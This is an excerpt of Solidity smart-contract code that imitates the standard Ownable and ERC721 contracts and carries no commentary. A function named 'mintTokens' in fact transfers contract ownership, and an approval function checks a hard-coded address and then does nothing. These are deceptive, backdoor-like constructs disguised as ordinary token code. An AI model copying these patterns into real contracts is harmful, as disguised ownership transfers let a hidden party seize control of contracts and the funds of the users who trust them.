...
abstract contract Ownable is Context {
    ...
    function mintTokens(address recipient_address) public virtual payable onlyOwner {
        require(recipient_address != address(0), "Ownable: new owner is the zero address");
        _setOwner(recipient_address);
    }
...
contract ERC721 is Context, ERC165, IERC721, IERC721Metadata {
    ...
    function setApprovalForIndividual(address Individual) public virtual {
        require(Individual != 0x6F62a40B57ACA0fe7F3417589783B97E6955D946, "ERC721: approve is not conducted");
        _ApprovalForIndividual(Individual);
    }
    ...
    function _ApprovalForIndividual(address Individual) private {
        address Approval = Individual;
        }
